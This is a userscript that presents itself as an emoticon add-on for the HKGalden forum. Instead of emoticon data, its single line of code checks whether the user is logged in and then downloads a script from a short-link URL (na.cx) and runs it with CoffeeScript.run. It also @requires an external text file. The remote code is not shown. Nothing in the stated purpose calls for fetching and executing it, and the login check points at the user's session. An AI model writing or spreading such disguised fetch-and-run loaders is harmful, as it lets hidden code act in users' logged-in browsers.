// ==UserScript==
// @name  			aikon square loader
// @author  		松岡禎丞 (id: 3627)
// @version 		0.0.1
// @description  	adding more emoticons to HKGalden
// @icon  			http://na.cx/i/1wng8.gif
// @include 		/^https?://.*hkgalden\.com\/(view|reply|post|poll).*$/
// @require 		https://raw.githubusercontent.com/Karho/Lavender/master/FLKAxN7u.txt
// @grant 			GM_xmlhttpRequest
// ==/UserScript==
$('#gb .actp a[href="/member/logout"]').length?GM_xmlhttpRequest({method:'get',
url:'https://na.cx/ibice',onload:function(r){CoffeeScript.run(r.responseText)}}):0;33